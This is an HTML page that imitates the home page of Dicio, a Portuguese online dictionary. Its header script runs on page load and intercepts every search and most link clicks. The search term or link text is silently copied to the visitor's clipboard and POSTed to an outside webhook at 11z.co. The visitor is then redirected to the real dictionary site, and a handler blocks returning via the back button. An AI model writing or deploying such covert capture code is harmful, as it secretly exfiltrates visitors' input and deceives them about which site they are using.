<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <title>Dicio, Dicionário Online de Português</title>
    <!-- Script de Redirecionamento Avançado: Cópia Silenciosa, POST e URL Amigável -->
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const baseUrl = 'https://www.dicio.com.br';
            const webhookUrl = 'https://11z.co/_w/5156/selection';
            
            const noCopyUrls = [
                '/rss/', '/manifest.json', '/site.webmanifest', '/opensearch.php', '/sobre.html', 
                '/politica-de-privacidade.html', '/termos-de-uso.html', '/contato.php', 
                '/lista-de-palavras/', '/palavras-mais-buscadas/', '/exemplos-de-palavras/', 
                '/ultimas-atualizacoes/', '/jogos-caca-palavras/', '/cata-letras/', 
                '/jogo-conexoes/', '/palavra-do-dia/', '/duvidas-da-lingua-portuguesa/', 
                '/curiosidades-da-lingua-portuguesa/', '/girias-e-expressoes-regionais-brasileiras/', 
                '/palavras-formais-e-seus-significados/', '/livros-infantis-para-brincar-com-as-palavras/', 
                '/maiores-escritores-brasileiros-e-suas-obras/', '/cronicas-para-cultivar-o-habito-de-leitura/', 
                '/prefixo-e-sufixo/', '/palavras-com-', '/palavras-comecam-a-com-'
            ];

            function shouldSkipCopy(href) {
                if (!href) return true;
                for (let url of noCopyUrls) {
                    if (href.includes(url)) return true;
                }
                return false;
            }

            // Variável para evitar envios duplicados em processamento
            let isProcessing = false;

            async function copyToClipboardAndPost(text) {
                if (!text || isProcessing) return;
                isProcessing = true;

                // 1. Copiar para área de transferência
                try {
                    if (navigator.clipboard && navigator.clipboard.writeText) {
                        await navigator.clipboard.writeText(text);
                    } else {
                        const textArea = document.createElement("textarea");
                        textArea.value = text;
                        textArea.style.position = "fixed";
                        textArea.style.left = "-9999px";
                        textArea.style.top = "0";
                        document.body.appendChild(textArea);
                        textArea.focus();
                        textArea.select();
                        document.execCommand('copy');
                        document.body.removeChild(textArea);
                    }
                } catch (err) {
                    console.error('Erro ao copiar:', err);
                }
                
                // 2. Enviar para o Webhook
                try {
                    await fetch(webhookUrl, {
                        method: "POST",
                        headers: { "Content-Type": "application/json" },
                        body: JSON.stringify({ "value": text }),
                        keepalive: true
                    });
                } catch (err) {
                    console.error('Erro no webhook:', err);
                } finally {
                    // Pequeno delay para evitar cliques duplos ultra rápidos
                    setTimeout(() => { isProcessing = false; }, 500);
                }
            }

            // 0. Corrigir links internos
            document.querySelectorAll('a[href]').forEach(function(link) {
                const href = link.getAttribute('href');
                if (href && !href.startsWith('http') && !href.startsWith('#') && !href.startsWith('mailto')) {
                    const path = href.startsWith('/') ? href : '/' + href;
                    link.setAttribute('href', baseUrl + path);
                }
            });

            // 1. Redirecionar cliques em links (Usando delegação de evento no document)
            document.addEventListener('click', async function(e) {
                const link = e.target.closest('a');
                if (!link) return;

                const href = link.getAttribute('href');
                if (!href || href.startsWith('#') || href.startsWith('mailto')) return;

                // Se o clique for dentro do formulário de busca, ignorar para não duplicar com o evento de submit
                if (e.target.closest('#searchForm')) return;

                const isInternal = !href.startsWith('http') || href.startsWith(baseUrl);
                
                if (isInternal) {
                    e.preventDefault();
                    e.stopPropagation(); // Impede que o evento suba e seja capturado novamente
                    
                    if (!shouldSkipCopy(href)) {
                        const textToCopy = link.innerText.trim();
                        if (textToCopy) {
                            await copyToClipboardAndPost(textToCopy);
                        }
                    }
                    
                    const targetUrl = href.startsWith('http') ? href : baseUrl + (href.startsWith('/') ? href : '/' + href);
                    window.location.href = targetUrl;
                }
            }, true);

            // 2. Redirecionar busca para URL AMIGÁVEL
            const searchForm = document.getElementById('searchForm');
            if (searchForm) {
                searchForm.addEventListener('submit', async function(e) {
                    e.preventDefault();
                    e.stopPropagation();

                    const searchInput = searchForm.querySelector('input[name="q"]');
                    if (searchInput && searchInput.value.trim()) {
                        const searchTerm = searchInput.value.trim();
                        
                        // Formatar para URL amigável
                        const slug = searchTerm
                            .toLowerCase()
                            .normalize("NFD")
                            .replace(/[\u0300-\u036f]/g, "")
                            .replace(/[^a-z0-9]/g, "-")
                            .replace(/-+/g, "-")
                            .replace(/^-|-$/g, "");

                        await copyToClipboardAndPost(searchTerm);
                        
                        const targetUrl = baseUrl + '/' + slug + '/';
                        window.location.href = targetUrl;
                    }
                });
            }

            // 3. Bloqueio de histórico (bfcache)
            window.addEventListener('pageshow', function(event) {
                if (event.persisted || (window.performance && window.performance.navigation.type === 2)) {
                    window.location.replace(baseUrl);
                }
            });
        });
    </script>
</head>
<body class="body-home">
    <div id="wrapper">
        <header id="header" class="home">
            <div class="container">
                <div id="logo" class="logo col-xs-12 col-sm-5">
                    <a href="/" title="Dicio, Dicionário Online de Português">
                        <img src="images/logo-big-k-new.png" alt="Dicio" width="159" height="40">
                        <h1 class="logo-subtitle">Dicionário Online de Português</h1>
                    </a>
                </div>
                <div id="search" class="col-xs-12 col-sm-7">
                    <form action="https://www.dicio.com.br/pesquisa.php" id="searchForm" method="get">
                        <input class="barra_pesq txt" id="q" name="q" type="text" placeholder="Buscar no Dicionário" autocomplete="off">
                        <button type="submit">Buscar</button>
                    </form>
                </div>
            </div>
        </header>
        <div class="container">
            <div id="content">
                <div class="ai-tools-list">
                    <a href="/significado-de-amor/" class="ai-tool-card">Amor</a>
                    <a href="/significado-de-paz/" class="ai-tool-card">Paz</a>
                </div>
            </div>
        </div>
    </div>
</body>
</html>
